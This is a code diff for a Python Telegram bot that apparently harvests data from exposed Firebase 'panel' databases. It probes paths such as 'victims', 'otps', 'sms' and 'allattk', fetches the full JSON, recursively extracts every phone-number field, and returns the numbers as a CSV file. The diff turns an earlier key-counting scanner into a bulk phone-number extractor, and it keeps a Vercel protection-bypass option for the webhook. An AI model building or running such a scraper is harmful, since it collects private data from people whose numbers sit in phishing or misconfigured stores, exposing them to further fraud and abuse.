@@ -32,10 +32,21 @@ VERCEL_URL = (
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger("panel-bot")
 
+# Paths to probe (full fetch, not shallow)
 PANEL_PATHS = [
     "", "users", "numbers", "phone", "phones",
     "sms", "otps", "allattk", "data", "victims",
+    "clients", "accounts", "All_Users", "All_User",
 ]
+
+# Field names that contain a phone number
+PHONE_FIELDS = {
+    "number", "phone", "phonenumber", "mobile", "mobilenumber",
+    "phone_number", "mobile_number", "contact", "msisdn", "tel",
+}
+
+# Regex to validate a phone number
+PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 
 tg_app = Application.builder().token(BOT_TOKEN).build()
 
@@ -44,7 +55,7 @@ tg_app = Application.builder().token(BOT_TOKEN).build()
 async def lifespan(app: FastAPI):
     await tg_app.initialize()
     await tg_app.start()
-    logger.info("PTB started. Alias: %s | bypass: %s", VERCEL_URL, "yes" if BYPASS_SECRET else "no")
+    logger.info("PTB started. Alias: %s", VERCEL_URL)
     yield
     await tg_app.stop()
     await tg_app.shutdown()
@@ -54,42 +65,62 @@ app = FastAPI(lifespan=lifespan)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Scanning engine
+# Phone extraction engine
 # ─────────────────────────────────────────────────────────────────────────────
-async def probe_path(session, base, path):
-    url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
+def extract_phones(node, found):
+    """Recursively walk JSON, collect values of phone-like fields."""
+    if isinstance(node, dict):
+        for k, v in node.items():
+            if isinstance(k, str) and k.lower().replace("_", "").replace(" ", "") in PHONE_FIELDS:
+                if isinstance(v, (str, int)):
+                    val = str(v).strip()
+                    if PHONE_RE.match(val):
+                        found.add(val)
+            else:
+                extract_phones(v, found)
+    elif isinstance(node, list):
+        for item in node:
+            extract_phones(item, found)
+    elif isinstance(node, str):
+        # Sometimes bare strings are phone numbers
+        if PHONE_RE.match(node.strip()):
+            found.add(node.strip())
+
+
+async def fetch_path(session, base, path):
+    """Fetch full JSON at path, return parsed data."""
+    url = f"{base}/{path}.json" if path else f"{base}/.json"
     try:
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
             if r.status != 200:
-                return path, []
-            data = await r.json(content_type=None)
-            if isinstance(data, dict):
-                return path, list(data.keys())
-            if isinstance(data, list):
-                return path, [str(x) for x in data if x is not None]
+                return None
+            return await r.json(content_type=None)
     except Exception:
-        pass
-    return path, []
+        return None
 
 
 async def scan_panel(session, url):
     base = url.rstrip("/")
     if base.endswith(".json"):
         base = base[:-5]
-    results = await asyncio.gather(*[probe_path(session, base, p) for p in PANEL_PATHS])
-    unique = set()
-    for _, keys in results:
-        unique.update(keys)
-    return url, sorted(unique)
+
+    results = await asyncio.gather(*[fetch_path(session, base, p) for p in PANEL_PATHS])
+
+    phones = set()
+    for data in results:
+        if data:
+            extract_phones(data, phones)
+
+    return url, sorted(phones)
 
 
 async def scan_all(urls):
     async with aiohttp.ClientSession() as session:
         results = await asyncio.gather(*[scan_panel(session, u) for u in urls])
-    per_url = {u: ids for u, ids in results}
+    per_url = {u: phones for u, phones in results}
     global_unique = set()
-    for ids in per_url.values():
-        global_unique.update(ids)
+    for phones in per_url.values():
+        global_unique.update(phones)
     return {"per_url": per_url, "unique": sorted(global_unique), "count": len(global_unique)}
 
 
@@ -118,11 +149,11 @@ async def send_rich(context, chat_id, html, keyboard=None):
 # ─────────────────────────────────────────────────────────────────────────────
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     html = (
-        "<b>PANEL FIREBASE SCANNER</b>\n"
-        "<i>online number counter + CSV export</i>\n\n"
+        "<b>PANEL PHONE EXTRACTOR</b>\n"
+        "<i>extracts phone numbers from Firebase panels</i>\n\n"
         "Paste one or more Firebase panel URLs.\n"
-        "One per line. I scan every path, count unique numbers,\n"
-        "and send back a CSV instantly.\n\n"
+        "One per line. I walk the whole tree and pull\n"
+        "every <code>Number</code> / <code>phone</code> field.\n\n"
         "<b>Example:</b>\n"
         "<code>https://panel-wala-v27-default-rtdb.firebaseio.com</code>"
     )
@@ -154,20 +185,21 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     ack = await context.bot.send_message(
-        chat_id, f"Scanning <b>{len(urls)}</b> panel(s)…", parse_mode=ParseMode.HTML,
+        chat_id, f"Extracting phones from <b>{len(urls)}</b> panel(s)…",
+        parse_mode=ParseMode.HTML,
     )
 
     result = await scan_all(urls)
 
     lines = [
-        "<b>SCAN COMPLETE</b>",
+        "<b>EXTRACTION COMPLETE</b>",
         f"<b>Panels:</b> {len(urls)}",
-        f"<b>Total online numbers:</b> <b>{result['count']}</b>",
+        f"<b>Total phone numbers:</b> <b>{result['count']}</b>",
         "",
     ]
-    for u, ids in result["per_url"].items():
+    for u, phones in result["per_url"].items():
         short = u.replace("https://", "").replace(".firebaseio.com", "")
-        lines.append(f"• <code>{short}</code> → <b>{len(ids)}</b>")
+        lines.append(f"• <code>{short}</code> → <b>{len(phones)}</b>")
 
     if result["count"]:
         lines.append("")
@@ -185,19 +217,19 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
         buf = io.StringIO()
         w = csv.writer(buf)
-        w.writerow(["number", "scanned_at"])
+        w.writerow(["phone_number", "scanned_at"])
         scanned_at = datetime.utcnow().isoformat()
         for n in result["unique"]:
             w.writerow([n, scanned_at])
 
-        filename = f"online_numbers_{ts}.csv"
+        filename = f"phone_numbers_{ts}.csv"
         doc = InputFile(
             io.BytesIO(buf.getvalue().encode("utf-8")),
             filename=filename, mime_type="text/csv",
         )
         await context.bot.send_document(
             chat_id=chat_id, document=doc,
-            caption=f"<b>{result['count']}</b> numbers · {filename}",
+            caption=f"<b>{result['count']}</b> phone numbers · {filename}",
             parse_mode=ParseMode.HTML,
         )
 
@@ -213,23 +245,16 @@ tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
 # ─────────────────────────────────────────────────────────────────────────────
 @app.get("/")
 async def health():
-    return {
-        "status": "ok",
-        "bot": "panel-scanner",
-        "alias": VERCEL_URL,
-        "bypass": bool(BYPASS_SECRET),
-    }
+    return {"status": "ok", "bot": "phone-extractor", "alias": VERCEL_URL}
 
 
 @app.get("/setwebhook")
 async def set_webhook(secret: str = ""):
     if secret != WEBHOOK_SECRET:
         return Response(status_code=403)
-
     webhook_url = f"https://{VERCEL_URL}/{WEBHOOK_SECRET}"
     if BYPASS_SECRET:
         webhook_url += f"?x-vercel-protection-bypass={BYPASS_SECRET}"
-
     await tg_app.bot.set_webhook(webhook_url)
     return {"webhook": webhook_url, "status": "set"}
 
@@ -238,14 +263,11 @@ async def set_webhook(secret: str = ""):
 async def webhook(secret: str, request: Request):
     if secret != WEBHOOK_SECRET:
         return Response(status_code=403)
-
     data = await request.json()
     update = Update.de_json(data, tg_app.bot)
     logger.info("update received: %s", update.update_id)
-
     try:
         await tg_app.process_update(update)
     except Exception as exc:
         logger.exception("process_update failed: %s", exc)
-
     return Response(status_code=200)
